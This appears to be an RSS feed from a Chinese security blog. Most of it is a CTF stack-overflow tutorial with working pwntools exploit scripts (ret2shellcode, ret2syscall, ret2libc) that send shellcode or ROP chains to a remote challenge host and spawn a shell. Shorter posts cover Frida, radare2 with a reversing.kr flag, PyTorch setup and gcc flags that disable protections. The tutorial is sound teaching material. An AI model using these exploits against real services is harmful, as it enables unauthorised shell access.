&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407132843.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407133456.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;payload:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#coding:utf-8
from pwn import *
# context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )
# sh = process(./ret2shellcode)
sh = remote(&amp;quot;47.106.212.155&amp;quot;,10002)
## 获得system(&amp;quot;bin/sh&amp;quot;)的asm
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080
# sh.sendline(shellcode+&amp;quot;\x90&amp;quot;*(112-len(shellcode))+p32(buf2_addr))
sh.sendline(shellcode.ljust(112,&amp;quot;A&amp;quot;)+p32(buf2_addr))
sh.interactive()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407134402.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;练习题：sniperoj-pwn100-shellcode-x86-64&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407140954.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407144021.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;偏移：&lt;code&gt;var void *buf @ rbp-0x10&lt;/code&gt;   shellcode可用空间：16+8=24&lt;/p&gt;

&lt;p&gt;找shellcode  &lt;a href=&#34;https://www.exploit-db.com/&#34;&gt;https://www.exploit-db.com/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://shell-storm.org/shellcode/&#34;&gt;http://shell-storm.org/shellcode/&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;    .global _start
_start:
    # char *const argv[]
    xorl %esi, %esi

    # &#39;h&#39; &#39;s&#39; &#39;/&#39; &#39;/&#39; &#39;n&#39; &#39;i&#39; &#39;b&#39; &#39;/&#39;
    movq $0x68732f2f6e69622f, %rbx

    # for &#39;\x00&#39;
    pushq %rsi

    pushq %rbx

    pushq %rsp
    # const char *filename
    popq %rdi

    # __NR_execve 59
    pushq $59
    popq %rax

    # char *const envp[]
    xorl %edx, %edx

    syscall
 */

/*
  gcc -z execstack push64.c

  uname -r
  3.19.3-3-ARCH
 */
 shellcode = &amp;quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56&amp;quot;
    &amp;quot;\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#coding:utf-8
from pwn import *
# context(log_level = &#39;debug&#39;,arch =&#39;x64&#39;,os = &#39;linux&#39; )
io = process(&#39;./shellcode&#39;)
# io = remote(&amp;quot;47.106.212.155&amp;quot;,10003)
shellcode =     &amp;quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&amp;quot;
io.recvuntil(&#39;[&#39;)
buf_addr = io.recvuntil(&#39;]&#39;,drop=True)
buf_addr = int(buf_addr,16)
# print(buf_addr)
payload = &amp;quot;A&amp;quot;*24 + p64(buf_addr+32) + shellcode
# 32是24字节的填充数据长度加返回地址长度24+8
print payload
io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&#34;ret2syscall&#34;&gt;ret2syscall&lt;/h6&gt;

&lt;p&gt;控制程序执行系统调用&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop&#34;&gt;ret2syscall&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407152204.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407152706.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;相对ebp的偏移为0x64=108  覆盖范围为+4=112&lt;/p&gt;

&lt;p&gt;没法ret2text,也没法ret2shellcode&lt;/p&gt;

&lt;p&gt;只有使用系统调用来getshell。执行 int 0x80即可执行对应的系统调用&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;,NULL,NULL)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用ROPgadget寻找gadgets&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407155958.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;这样就能够控制到eax,ebx,ecx,edx寄存器。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407160123.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407160710.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;写payload:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#coding:utf-8
from pwn import *
# context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )
# io = process(./ret2syscall)
io = remote(&amp;quot;47.106.212.155&amp;quot;,10004)

pop_eax_addr = 0x080bb196
pop_ebcdx_addr = 0x0806eb90
int_0x80_addr = 0x08049421
bin_sh_addr = 0x080BE408
payload = flat(
    [&amp;quot;A&amp;quot;*112,pop_eax_addr,0xb,pop_ebcdx_addr,0,0,bin_sh_addr,int_0x80_addr]
)
io.sendline(payload)
io.interactive()

&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&#34;ret2libc&#34;&gt;ret2libc&lt;/h6&gt;

&lt;p&gt;ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(&amp;ldquo;/bin/sh&amp;rdquo;)，故而此时我们需要知道 system 函数的地址。&lt;/p&gt;

&lt;p&gt;eg1:  &lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1&#34;&gt;ret2libc1&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407175007.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-64h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts(&amp;quot;RET2LIBC &amp;gt;_&amp;lt;&amp;quot;);
  gets(&amp;amp;s);
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407175502.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190407175715.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;exp1:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

# io = process(&#39;./ret2libc1&#39;)
io = remote(&amp;quot;47.106.212.155&amp;quot;,10006)
binsh_addr = 0x08048720
sym_plt_addr = 0x08048460

payload = flat([112*&#39;A&#39;,sym_plt_addr,&#39;b&#39;*4,binsh_addr])
# &#39;bbbb&#39; 作为函数调用栈返回地址的虚假的地址

io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;p&gt;eg2:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2&#34;&gt;ret2libc2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;缺少/bin/sh 只能自己寻找gadgets来进行构造。&lt;/p&gt;

&lt;p&gt;exp:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *

# io = process(&#39;./ret2libc2&#39;)
io = remote(&amp;quot;47.106.212.155&amp;quot;,10007)
# binsh_addr = 0x08048720
sym_plt_addr = 0x08048490
sym_imp_gets_addr = 0x08048460
pop_ebx_addr = 0x0804872f
buf2_addr = 0x804a080

payload = flat([&amp;quot;A&amp;quot;*112,sym_imp_gets_addr,pop_ebx_addr,buf2_addr,sym_plt_addr,&#39;x&#39;*4,buf2_addr])
io.sendline(payload)
io.sendline(&amp;quot;/bin/sh&amp;quot;)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;eg3:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3&#34;&gt;ret2libc3&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2的基础上去掉了system的地址。&lt;/p&gt;

&lt;p&gt;got 表泄露libc的函数地址&lt;/p&gt;

&lt;p&gt;利用思路：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;泄露 __libc_start_main 地址&lt;/li&gt;
&lt;li&gt;获取 libc 版本&lt;/li&gt;
&lt;li&gt;获取 system 地址与 /bin/sh 的地址&lt;/li&gt;
&lt;li&gt;再次执行源程序&lt;/li&gt;
&lt;li&gt;触发栈溢出执行 system(‘/bin/sh’)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;exp:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from LibcSearcher import LibcSearcher

context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )
# io = process(&#39;./ret2libc3&#39;)
io = remote(&amp;quot;47.106.212.155&amp;quot;,10008)
elf = ELF(&#39;./ret2libc3&#39;)
puts_plt = elf.plt[&#39;puts&#39;]
start_main_got = elf.got[&#39;__libc_start_main&#39;]
main = elf.symbols[&#39;main&#39;]

payload = flat([&amp;quot;A&amp;quot;*112,puts_plt,main,start_main_got])
io.sendlineafter(&amp;quot;Can you find it !?&amp;quot;,payload)

libc_start_main_addr = u32(io.recv()[0:4])
libc = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_addr)
libcbase = libc_start_main_addr-libc.dump(&amp;quot;__libc_start_main&amp;quot;)
sym_addr = libcbase+libc.dump(&#39;system&#39;)
binsh_addr = libcbase+libc.dump(&#39;str_bin_sh&#39;)

payload = flat([&amp;quot;A&amp;quot;*112,sym_addr,&amp;quot;bbbb&amp;quot;,binsh_addr])
io.sendline(payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;中级rop&#34;&gt;中级ROP&lt;/h5&gt;

&lt;h6 id=&#34;ret2csu&#34;&gt;ret2csu&lt;/h6&gt;

&lt;p&gt;利用 x64 下的 __libc_csu_init 中的 gadgets.&lt;/p&gt;

&lt;h6 id=&#34;ret2reg&#34;&gt;ret2reg&lt;/h6&gt;

&lt;h6 id=&#34;brop&#34;&gt;BROP&lt;/h6&gt;

&lt;h5 id=&#34;高级rop&#34;&gt;高级ROP&lt;/h5&gt;

&lt;h6 id=&#34;ret2-dl-runtime-resolve&#34;&gt;ret2_dl_runtime_resolve&lt;/h6&gt;

&lt;h6 id=&#34;srop&#34;&gt;SROP&lt;/h6&gt;

&lt;h6 id=&#34;ret2vdso&#34;&gt;ret2VDSO&lt;/h6&gt;

&lt;h5 id=&#34;花式栈溢出&#34;&gt;花式栈溢出&lt;/h5&gt;

&lt;h5 id=&#34;canary-绕过技术&#34;&gt;Canary 绕过技术&lt;/h5&gt;
</description>
      
    </item>
    
    <item>
      <title>Frida从入门到放弃_1</title>
      <link>https://naivete.cc/post/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_1/</link>
      <pubDate>Tue, 22 Jan 2019 20:39:26 +0800</pubDate>
      
      <guid>https://naivete.cc/post/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_1/</guid>
      
        <description>

&lt;h3 id=&#34;0x00-frida&#34;&gt;0x00 Frida&lt;/h3&gt;

&lt;p&gt;Frida 官网：&lt;a href=&#34;https://www.frida.re/&#34;&gt;https://www.frida.re/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;github: &lt;a href=&#34;https://github.com/frida/frida&#34;&gt;https://github.com/frida/frida&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Dynamic instrumentation toolkit for developers, reverse-engineers, and security
researchers.&lt;/p&gt;

&lt;h3 id=&#34;0x01-安装&#34;&gt;0x01 安装&lt;/h3&gt;

&lt;p&gt;用python&lt;/p&gt;

&lt;p&gt;&lt;code&gt;pip install frida-tools&lt;/code&gt; 就一个命令搞定&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Failed to load the Frida native extension: DLL load failed: 找不到指定的模块&lt;/p&gt;

&lt;p&gt;报了这个错 查了大半天 原来我用的版本是基于python3.7编译的。我现在用的3.6.。。。。&lt;/p&gt;

&lt;p&gt;作者真的是脑子一根筋。。。 所以只好升级成3.7.。。。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-android环境&#34;&gt;0x02 Android环境&lt;/h3&gt;

&lt;p&gt;设备：小米mix2 运行Android8.0 MIUI10开发版已解锁root&lt;/p&gt;

&lt;p&gt;frida-server: 用的arm64版本&lt;/p&gt;

&lt;p&gt;下载号frida-server  然后adb push 进去&lt;/p&gt;

&lt;p&gt;&lt;code&gt;adb push frida-server /data/local/tmp&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;然后&lt;code&gt;chomd 755 frida-server&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;运行&lt;code&gt;./frida-server&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190112133452.png&#34; alt=&#34;frida-server&#34; /&gt;&lt;/p&gt;

&lt;p&gt;命令行运行&lt;code&gt;frida-ps -U&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://my-md-1253484710.file.myqcloud.com/20190112133604.png&#34; alt=&#34;frida-ps&#34; /&gt;&lt;/p&gt;

&lt;p&gt;安装成功&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>radare2&#43;cutter使用指南</title>
      <link>https://naivete.cc/post/radare2&#43;cutter%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</link>
      <pubDate>Wed, 02 Jan 2019 20:39:26 +0800</pubDate>
      
      <guid>https://naivete.cc/post/radare2&#43;cutter%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</guid>
      
        <description>

&lt;h3 id=&#34;0x00-介绍&#34;&gt;0x00 介绍&lt;/h3&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/radare/radare2&#34;&gt;radare2&lt;/a&gt; 一个很实用的二进制分析和调试工具&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/radareorg/cutter&#34;&gt;cutter&lt;/a&gt; 是r2的GUI版。&lt;/p&gt;

&lt;h3 id=&#34;0x01-安装&#34;&gt;0x01 安装&lt;/h3&gt;

&lt;p&gt;支持的平台有如下：&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Windows (since XP), GNU/Linux, OS X, [Net|Free|Open]BSD,
Android, iOS, OSX, QNX, Solaris, Haiku, FirefoxOS.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Linux平台下直接&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/radare/radare2
cd radare2
sys/install.sh //(or sys/user.sh)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Windows下可以下载二进制安装包安装。官网&lt;a href=&#34;https://www.radare.org/r/&#34;&gt;下载&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Windows用户推荐使用Windows下的linux（wsl）来使用， win下更新慢。还是linux下用得舒服（方便，快捷）。&lt;/p&gt;

&lt;h3 id=&#34;0x03-工具介绍&#34;&gt;0x03 工具介绍&lt;/h3&gt;

&lt;p&gt;r2常用的包含有一下组件：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;rax2 用于数值转换&lt;/li&gt;
&lt;li&gt;rasm2  反汇编和汇编&lt;/li&gt;
&lt;li&gt;rabin2   查看文件格式&lt;/li&gt;
&lt;li&gt;radiff2 对文件进行 diff&lt;/li&gt;
&lt;li&gt;ragg2/ragg2­cc  开发shellcode工具&lt;/li&gt;
&lt;li&gt;rahash2  各种密码算法， hash算法&lt;/li&gt;
&lt;li&gt;radare2 整合了所有工具&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;使用帮助直接&lt;code&gt;-h&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;rax2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123153746.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;rasm2&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123153901.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;E:笔记Typora学习日记assets1542959275318.png&#34; alt=&#34;1542959275318&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;rabin2&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123154355.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;eg: (&lt;code&gt;-I&lt;/code&gt;)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123154422.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;radiff2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123154448.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;ragg2/ragg2­cc&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123154514.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;rahash2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123154604.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;radare2 (最常用) 可缩写为r2&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123155156.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;0x04-r2-实战学习&#34;&gt;0x04 r2 实战学习&lt;/h3&gt;

&lt;p&gt;challenge来源于：&lt;a href=&#34;http://reversing.kr&#34;&gt;http://reversing.kr&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;先查看一下文件信息：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123155334.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;GUI?:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123155444.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;用r2载入，自动分析&lt;code&gt;aaa&lt;/code&gt;命令：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123155649.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;vv&lt;/code&gt; 命令查看界面：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123160028.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;注意0x00401080 调用了GetDlgItemTextA&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123160457.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;s 调到main函数，查看main的汇编代码：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123160744.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123160818.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;pdc&lt;/code&gt;查看伪代码：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123161145.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;大写的&lt;code&gt;VV&lt;/code&gt;命令查看图形界面 使用hijk来进行界面移动。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123161242.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;看到调用地址0x401020，s跳过去 ；发现没解析 可使用af来解析。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123162026.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;看到GetDlgTemTextA调用：&lt;/p&gt;

&lt;p&gt;函数调用&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123162157.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181123162302.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;差不多逻辑就是一直比对字符串，从第二位开始比最后第一位&lt;/p&gt;

&lt;p&gt;得到&lt;code&gt;Ea5yR3versing&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;命令记不住或者想知道有些什么命令可以用就可以加个？号查询&lt;/p&gt;

&lt;h3 id=&#34;0x05-cutter的使用&#34;&gt;0x05 Cutter的使用&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;多图待补&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&#34;https://legacy.gitbook.com/book/radare/radare2book/details&#34;&gt;Radare2 Book&lt;/a&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>Pytorch学习_1安装</title>
      <link>https://naivete.cc/post/pytorch%E5%AD%A6%E4%B9%A0_1%E5%AE%89%E8%A3%85/</link>
      <pubDate>Sat, 08 Dec 2018 23:40:51 +0800</pubDate>
      
      <guid>https://naivete.cc/post/pytorch%E5%AD%A6%E4%B9%A0_1%E5%AE%89%E8%A3%85/</guid>
      
        <description>

&lt;h3 id=&#34;前言&#34;&gt;前言&lt;/h3&gt;

&lt;p&gt;本来想着用&lt;strong&gt;tensorflow&lt;/strong&gt;的 然而GPU版总是报各种各样的BUG&lt;/p&gt;

&lt;p&gt;所以打算入坑一下学pytorch&lt;/p&gt;

&lt;p&gt;配置：win10+i76700HQ+GTX1060+16G&lt;/p&gt;

&lt;p&gt;软件版本：CUDA10+python3.6+pytorch 1 源码编译&lt;/p&gt;

&lt;p&gt;尝试1：官方安装方法不支持 CUDA 10 太坑，社区有编译通过的，所以只有自己编译试试&lt;/p&gt;

&lt;p&gt;报各种异常，但是没停，那就等等&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181204002444.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181204153247.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;CPU被占满，巨卡。&lt;/p&gt;

&lt;p&gt;一觉起来之后：安装失败&lt;/p&gt;

&lt;p&gt;尝试2：等着完全支持CUDA10之后在用GPU跑吧。&lt;/p&gt;

&lt;p&gt;妥协：用阿里云的学生服务器装了CPU的版本：顺便把TensorFlow 也给装了。。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181204153129.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;然而 在一个星期之后 pytorch1.0出来了 支持了CUDA10    nice&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;pip3 install http://download.pytorch.org/whl/cu100/torch-1.0.0-cp36-cp36m-win_amd64.whl
pip3 install torchvision
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20181208233904.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;期间没有遇到任何问题 真舒畅。。。&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>PWN 小tools的使用</title>
      <link>https://naivete.cc/post/pwn-%E5%B0%8Ftools%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Mon, 22 Oct 2018 20:39:26 +0800</pubDate>
      
      <guid>https://naivete.cc/post/pwn-%E5%B0%8Ftools%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
      
        <description>

&lt;h3 id=&#34;gcc-编译常用命令&#34;&gt;GCC 编译常用命令&lt;/h3&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;center&#34;&gt;不带选项&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;gcc test.c        将test.c预处理、汇编、编译并链接形成可执行文件。这里未指定输出文件，默认输出为a.out。&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;-o&lt;/td&gt;
&lt;td&gt;指定生成的输出文件；&lt;/td&gt;
&lt;td&gt;gcc test.c -o test  将test.c预处理、汇编、编译并链接形成可执行文件test。-o选项用来指定输出文件的文件名。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;-E&lt;/td&gt;
&lt;td&gt;仅执行编译预处理；&lt;/td&gt;
&lt;td&gt;gcc -E test.c -o test.i   将test.c预处理输出test.i文件。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;-S&lt;/td&gt;
&lt;td&gt;将C代码转换为汇编代码；&lt;/td&gt;
&lt;td&gt;gcc -S test.i   将预处理输出文件test.i汇编成test.s文件。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;-c&lt;/td&gt;
&lt;td&gt;仅执行编译操作，不进行连接操作。&lt;/td&gt;
&lt;td&gt;gcc -c test.s   将汇编输出文件test.s编译输出test.o文件。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;-wall&lt;/td&gt;
&lt;td&gt;显示警告信息；&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&lt;strong&gt;无选项链接&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;gcc test.o -o test 将编译输出文件test.o链接成最终可执行文件test。&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;-O&lt;/td&gt;
&lt;td&gt;使用编译优化级别1编译程序。级别为1~3，级别越大优化效果越好，但编译时间越长&lt;/td&gt;
&lt;td&gt;gcc -O1 test.c -o test&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&lt;/td&gt;
&lt;td&gt;关掉DEP/NX（堆栈不可执行）&lt;/td&gt;
&lt;td&gt;gcc  -z execstack -o level level.c&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&lt;/td&gt;
&lt;td&gt;关掉Stack Protector/Canary（栈保护）&lt;/td&gt;
&lt;td&gt;gcc -fno-stack-protector -o level level.c&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&lt;/td&gt;
&lt;td&gt;关掉程序ASLR/PIE（程序随机化保护）&lt;/td&gt;
&lt;td&gt;gcc -no-pie level level.c&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td align=&#34;center&#34;&gt;&lt;/td&gt;
